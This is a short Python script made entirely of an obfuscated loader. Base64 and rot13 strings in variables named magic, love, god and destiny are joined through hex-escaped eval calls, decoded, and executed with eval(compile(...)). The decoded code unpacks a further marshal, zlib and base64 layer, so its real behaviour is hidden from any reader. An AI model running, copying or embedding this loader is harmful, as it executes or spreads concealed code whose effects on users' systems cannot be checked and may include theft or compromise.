import base64, codecs
magic = 'Xz0obGFtYmRhIHg6eCk7Y29kZT10eXBlKF8uX19jb2RlX18pO18uX19jb2RlX189Y29kZSgwLDAsMCwwLDEwLDY0LGInelx4MTZlXHgwMGVceDAxZFx4MDBceDgzXHgwMVx4YTBceDAyZVx4MDFkXHgwMVx4ODNceDAxXHhhMFx4MDNlXHgwMWRceDAyXHg4M1x4MDFceGEwXHgwNGRceDAzXHhhMVx4MDFceGExXHgwMVx4YTFceDAxXHg4M1x4MDFceDAxXHgwMFdceDAwZFx4MDRTXHgwMFx4MDRceDAwZVx4MDV5L1x4MDFceDAwWlx4MDZceDAxXHgwMHpccmVceDA3ZVx4MDhlXHgwNlx4ODNceDAxXHg4M1x4MDFceDAxXHgwMFdceDAwWVx4MDBkXHgwNFpceDA2W1x4MDZkXHgwNFNceDAwZFx4MDRaXHgwNltceDA2d1x4MDF3XHgwMCcsKCdtYXJzaGFsJywgJ3psaWInLCAnYmFzZTY0JywgYidlSnpOV2QxdjIxYVdKeWxLb21SYi9uWVNKM1dZejBhSkpjdHhQcHVQVHRxbVRTZUoxZHJ1dEdVbjY2VjFyMlhhRktsY1hzVVdJUS9TZW9EWlhXeUFEaWJGTHFZdFlMK05nY0U4emVNOEwvWXYyQWM5cHZ2U2g4RThMQlpZQ0F2TW5uTkpTWlEzbXlrd0wydUJoNWYzNDl6TGU4NzVuZCtsdjVNTy9LbHcvUWl1L3pnS2draEV0aVZEb2pLVmRoV2k3TWs3c2d4MWkxSnFQL1k5ZHAvM3BvNUowbmNIdGFSRExkNC9LRjB0NGk0YnNyZ3JoaUx1TVNNbTdxcWh3bDJ4NDVXRWtaQ3hiOHhPVmpSREUyVVZ5aWtqSmNweE8xM3BNL3BFT1dIM1Z3YU1BVkZPMnBuS29ERW9TMlhKR0NLYU1VeTFIY2tZSVNtUy9ybGtqSkkrMGcvM01USkFNbkFmSjROa0NPNFQ5QkFaM2xDK2xObmIvci9RMk81aE1ySUg3eWhLbzZJMFNBZldqNUF4T3Z5MTlLMUN4c2tFT2ZRc2h2dEErOGhoY3VTWmJFelN5ZldqWkpJY0pjZklhMlRxbVFwdFdIT2M2T1RFTXlWOE9nbnRwOGpwWnpGODNqMUd6cEN6NVBXOTl0TTVrbzA4blNjWHdxZVI5VUU2U2FaaDFtQmtzSm9jUElObXNZcVIzZGRJZms4MnB1Z1VtZGxRMkwrRmZRb3Y2WE04Ykp1TnRJM1Q0M2ovV05nVmRGd0VIZjhWOXB0N2lRNDliTHNVYVp1Z2VvK095MkpIKzhPZVZ5STlUK3hJblg1QjY5V1h0Nm9TUGZtbFhIOUxsb3hUc3VRZkRYdGZvNmZwcVIxNTk4eWVKT3h4UFdLUGNQU25NTjQ0OWRrcDFCS1VOdVZOb1RQN1J1QzBXYms1K0xick9MVEVMZGU1eTVqTG9Db0pWWjVyVXlqRzMyTnVyWXFGSlhNbHFQbkFkS2lOaFNxekhGNzdOZWo1Yk1XMWljNG9tWDMwNHF2bkw3NzY4c1ZYLzZTL2VQNWJIY1dMNS8vNDR2blRGOCsvN0JUU1BmMS9LZnIvRm9hOGVQNEZqdmlpM2ZHZk80VndSSm5SK215aEFJTitMUVo5aTRYbnYyOTNoc0x6ZGprc2xKUklNTWJoU3NEMU5nYmtUMEEwWURQR3BJWjhTTnBXR2dyTGNxbWhFSGxIK2FteUhkdFd1VXlVUm96RXZsYUoybERGUGY1dG5DUklFbDJaSzdzeG9tRmd3Qmp0bXREZ2FTUUZtNXVlLy80bWFLK2Q2MnhOZStINGVzSEtudDd1dEZCbjlwR'
love = 'aI4DJ9LH1I0X3q4Y1ELY0kLn2qzZwIKLH1CqIV3E1cErHMToGSgH0EKnmEjGSqPFJIgrKRmF3WEJwxlrRgkBJ00EJR5HKteFxqhExW1LyWbrQqhGSEBnRgcL3EfFHkWqaSzJJgBAQSQEzkXqyRjITWlE2E5LHyFEQymnKOhAHAeAHkKqKxeqQykoxxkD1cGn0gvMwObqx1Jq3yZY0AcqapiEIOhqxcGA3E3pwMFZxb2rHELDmSkY3uQI3OIFwqBpyOBHwEdrIVmAHuKoRtmpR8mJzSWnRyXElgvZxkvD2kzJQD2HJL5oxuaE2I3BUyEERIQoRWkrR5MIUH4nmyuIzMvnmuXrTSdDH83ERt4nyujM1cXrJ5xqR5epRWTMwp5qSExqaAFqUWMITMUDGZjZTyaoyA5FzcPFUEJrxcQEwubEQIRERyWZySGFxSOI1AWDKAeDHWKFHHeHHMAnID1DyEWZPgEGIAODKOeG2MSpHA3AHDiFHZ2HJZ1ITEWM2A3ZmSJY0blp3OTo3yCDyMyJTqlETEMZyAUJJSKnH5XD3Z5nGW5n3xlZTqTAl9BEIylBSEvZ2kFqxqLpJL3ZJkKpKp2qyWxDJyvHJ84H0HeqxD0D01VH0cLDGEaM28eE0IQEJuFHRA4X25yrKEBZxuODxtlqzAZFRpmZRSSDx1bHHM5EaAxL0AaE2yDDyyQDH1HY3WErQSPD1SSnJHmZ2IgESWLH29GqJk0MKZ5HGV3AUWdIat4rzc0H2IvImAJMx9XYmR1oUIRIJkApKyFE0uIGHgmG1ywG01Eozywq2y3HwykZzcQA3uxBHgyY0WCJGyZE0AeZyufX2S6H1ERESEWImqTH0cHI1uYqRIiIJWXEwE5HwIKF2uKDySLrHSZMGxlIzc1FJyfM3SapTyTpzu1oKqSY1ExZKZjq2E1oSMfqQATLHE4MJuDEQOmX1ywpaOfMzW5GvfjZ1cXpTH3MachImqzpQMPGTR5HayDEmMKoIMhFyN3JKDmBPgLZ0Ijpwt2FUWKA1c0rzk6G0LiHacRrKyhqT5JEULeGIR1oUOSqwZ1EStmnwE5MKbkHmqBJv9IAwSuqR9DAzAjBJx4BJAhpaIuowq1nJ43qP9vX25bMmWhMUEdLJ8inQE0LzWbJv9yZQR1oTWiryOJD3MjDl9xE211n0j5rIWLY29loTplZIWzGyMnGyb0MHWKnTckAJc4LJ5kJSOdBTRkDl9homVkoSE2qIV1qaOKp2InITgHoUZ1LzplLKOFF3Z4JwI0G3IEJyLipxHkraS2MHq6GKcZZ21JE1yHrH5Ko1A5nauzqJSVZ0qQp1p0qHIcIKO6IRyApT9lDKqaoaq4HxWnnGEOY1Een0yGFKIOHQDeEKMfp2WWomqwp3DeHyyQn2AxJx5mJJ1MDzqMHaOapUIWHwSmF3SOnwRkpxWvLaSUnKt5ZQqMBREgqKZmowEBEwEQqJZkpaydrUxjIwMxJSMgJSyeIGWbG0x0pHIcJStmLxWaDau5rySgX2ELG2W1Dz5JGmMeBH11q2SDAF9ZowZ4rJI2GGOUp0DeGmyOMRgnoJ1BAJgkqKp1oUVeAz1YqIyKLzIkqySUqxciF1MxLKx5JR1LEIIMpUSKBR9yp2MkIyMbG3qhGaqwA1AIomAFFRgCHTR5ITcLoR9yLyAnL1cjIKEjZ1tjEzM2MwMmMxc3E3p1JUR5Hl80HHcRoH9JIR15ZR0kqGI6LmABZ0glGRgln2SmAzkHL2qeoUWnHz5DpHH1JJ5YraSvnH9yGzkgFJcQAF93qR90Y2cAE3RiJGO6ZxgmG2WQZKAVLJybZGDjLyWJM1cyL01nBIykZxM4nmL1IGV3IyMjra'
god = 'g5ZnVhODZIcXRSNEZubFIxS2NuU3J0QWF1Um04OHViVXlGMmhzWlhDN1ZpbUhIZk1zVGx0OUhoZ2dGKzVIcEJFU0V6VTBCNll1bTV6NmtSWjA2R2hQQXJ0cWFNUXQxU0E5OFdhUzBWWEtLQk4yWnBoRUlSWVNnWUdiR2c1R2t4dGExZlM4VFpjUi84U3Jnc0IyWVYzN1NsUEZiV1U2dWtMNms4V0ZkM05MeGZ0MzUvL1BtR0FuVUp4RWNWcXNJT0x0eFFDQUFvSElKSXFGTUE3YXlOVHhkbllXQkY3c2RaejlRb1Q5aU1YcFpiTnMycnBuMmViYWh1bm9OWXh1UzdmTnN0VktpNzZsdXVuTVFkekZQVjRIOSt5TGFHaU5CQTkxYXR2dTVxTzdDd3ZGQlhqYk9MZTRUZGt0WFBvaE5vNUxUeUxhQW1OcnF1dXU1VFRqREEzYjFEcGVIU3RUYmlTRHFQSU1EWjZXaVZYaXpUZ1l1ZUkxRlVhYkNZK2FyTFFHVkFOOHNSa3ZJemRzSnJsWnFkYWNNbmhxdFFvTXBhbFdBYllFSjJISXRwcXhWUXNtcFZzZ1UzZTMwSm5CdzlnWmJJckRtaW5MOWdlYldDeEdkakZBL0xDdXM5WEZzSVBZNTBMWUs4d0lZVzA0TUxpRWlrSm90cTZoQ3NWd3huYlBzRmNudVFUSkpqQnVNUXB1QWJwRkhVRE1HS2FyWXJFN1k3anVVRnNoOUlwREhReU1DN0JEci9LbU1XRUI0ZXFYajhHRnRDc0R2ekVnWHdTZWgwVE5rRHlsWk9RcnN2WlUrVE5iUURJV2RWM01aNE50YXJ1QVpPeHpBaVFySmZrVkxtR3lKMEN6aUVvRWZXMVRMOUtQWjBDa1drQjFoNDlJWk9TYnpIWU15dklScE1halpPd2JwTUZBZFBlazdUalFLcldoTkZTZ3hPTkFaeEprZ3NjYmlmWEVqZ3gwNW9NR2FMZ3FRYTVQY20wOVJRNDE1SzhsY3ZqYkdCSXNjalNrSGVuZFBuSU1TWTJqazljaW94M2V2enRBcHZBWmlGdUdEQU1GU3ZKQlB0UUF3b2lFSE1iS3U4TjdnclE4amdXWE13aTBaNlQrVkpid3g1UGRVK2FuMEw0cFBWYWhmYlQrRzZCRm1xQkZ3Y3BPd3J3YTBLS3hrQmFkaXF4dlBFS0x0SjlwSVMyQ2txQkZwK2NGOVZscTZhL0NHdzlDZ0NFTmFjVUFXcHVaVHg0K3VBZmRGNEl3WStmUi9nVVUrRjJoVmZpTFNRSHk5cHJKUE1wdmZiVDBidTRheStIWU9VSDRTeTd6bW5GYXFmSzZuMzNWbXN3YWQxZGRXd1NieDQ2aEJreU0rNWtncWM0aUxBMXR0Uk1jNFA2bXhkZFlGdHRtT2xrM2p3STlsVjFFY1FuRlpSUlgyamxaWUxVeDBEUGJmb3hkeFZyVnRwd05RK1d1YTdQcitPWkhQblZyVEVlbzBDMVA5MnFRNVR4dnRXYmI5Vlptb09kczVCL050OXYxQzdNRnZhTmJuSXpHZS9EdnJic0w5KzRzdnYrQTNjRDEvQWlGaHJPZGh0bjBOY2l1dW1rem9FUjFIZklJak1JMXJNSTBPcUVWdHpWbXJuTEtkRUVlOUFwUVAwNjkvSCsrS2ZXY2NLTm5PSDNEZGVpR1ora2JacVdtcjFBR01XMENqQjg4dnpFOEtMRStGTGRSb01yc2hBaGpkaC9GTzJqUTVDSzhJbUxqUTZ4Q2dHVHZvK2hBS1p0SGdYSE84SXpHM2tOeEQ4V1BVWXdLdEVXSWo1ZHNRR3FHdElwOWdPSkRGRVdjTmRXR3VSQ3UydmhZaUt'
destiny = 'PJRVknHkWHHAZX25PM0M4EHkWH0fmo2WRJHWyoaqALzyTqHVkDJAdDaEKZmWvAaMzGGWAoJ1PZzkdFJcOBH9kEwAXL1WADyt0FaIXBRMbGySSIz1lrH9ME2IUL0WCIyMTLv9wn2uKMz16BUSzGJSWnJH1FyuiAyABAzMbI2x1X2LiGQyVrwOfX0EhqIV0Jx93JQEMqmM6Dx4eMFgWnvgALH9Sn0unZTMlrxEmpJITGv91MJkTZaWDAxuOrJt3FzgHJwuFDzk6ZTWyJFgGIxgDqQMcGRcAp0EOEIIlLHH0nH1IqzIdFwuPqR9TrREnrUyaX1SHDGp4AJMEEHH5o3WWqHH3EyOSpHMGZ3uwDxg4D24lE1ykMz90F0cLnTcQnzqbDwqPFQV2GIIvBJcwo2khFSH4HGuaExDjF1RkL3STqTAPp3ueqQuEEQESDyN5rKuTp2qyoTEjAaqZJzqPGHIBqRMHBUAjq3yCnQElJxAVJJu0Y01ZEF9bLxMRBRIKJaSZARfmD0MlLHSiqSqVn0SZHHyJE2gHAQOZFJ5eFyIYJIAmET1mA2IBFT1yHxIWLIb4Jx85q3AKqQAgIKtmqIuyrz9YoyAXJSO2nmWyE0ubHmIiMSWhnISJHyVjJxf0H2D0LyO3nSEAqxyeAUAjIScULHSYZl9AnxyyASSfE2W0pauwGIZkozIxoyu5oHE2F21EZUAKZFgjqzEHo0teoHb4oGyDAlf0MR9yBJuHp1N5IUAzGSWLZJD0p1OVnSRiqaW1qmWVI3AfpKuhJyuMFRuHIFf3ZIcwDzgxM09QAIWnqySbHFgQGISepJWKARg6IJ5YBHWcAacKnTLjZmOaAwq2FJ1AAaDeZ3c1HGA1DHx5FxR2GzV4Y3IbnzuHEIccn1c1BQI2oQyeJSMfEyqvnRSfD1ElBUcgY2AAJHx1EIHmDJg3HKyhGlf4pxM2EQu1MJ9aq2ydIQq5oUcyH0q4HKHlJKxlFRp2rKLmJTI6MJgwYmMjI3WuZKOaMQHkFH1JZIAuoUyVMSH4LyHjoJ9ZJxWJrTWloTEnGmEZLKNjJTDmF2p1n2ELGHuXnJWSnSOdnzclpx1YZxEWZ3Mzp3yfMwyDGKMhX0cOn0uvoz1DAJuwq1R3ZIcHov9CGHuPp0Z1rKWHZQyFpzA4E213qyqAD0gmHKIaJGD2F3III01HMQOOpUR0qIMurxyeDaqBM2biBSuuDH54JSuSY0M0nxknHTMhozSDpSV1FKS5GzMgLILkM0SkrSD4DxqXAxgUJQIGGGyYnJ51GF9OoTx4ImSVEzM3M0yVERMIpxSbqmIvAKqkHyuHL2APETflZJkOn29SGxqSHmqeHH1goJt1E2Z2JTEuD2MTHHMVHzk4GIcYHx5EpScZpzjlpx9SJIA5BUcxnRECpSH2ZKuEZSterUR0FwqCAIyWGHShnRguoIEOGmNeA0SHBRSxD1t3qScwIJ5BpUWwrQILnHx4qJAaq0kmY0MLAxcgD1cloJcunRuIAIOYM0SPnmAOp0q3EISUDxgVGxk5HTyYY2gWZxL5qQIGE1x5qIIAnSSyZaEFY3t5D3AOFzEzGGVjBRD5GIAhowyBAUHlFSIWrJyBIUcdn1cZFayArHueGRS1ZT55ZJMgD1MuDKOXZTIHY0SGMQEhX2p9WljtGz9hMFxfXPqyrTIwWljtW19snJ1jo3W0K18aYPNaoT9uMUZaYPNaMTIwo21jpzImplpfVPqvAwExMJAiMTHaYPNaEKuwMKO0nJ9hWljtW2HaYPNapUWcoaDaYPNap3ElWlxfXPxfW0kuoJWxLF5jrFpfWmkgo2E1oTH+WljkYTVaYyk4ZQRaYPtcYPtcXGgsXPx='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
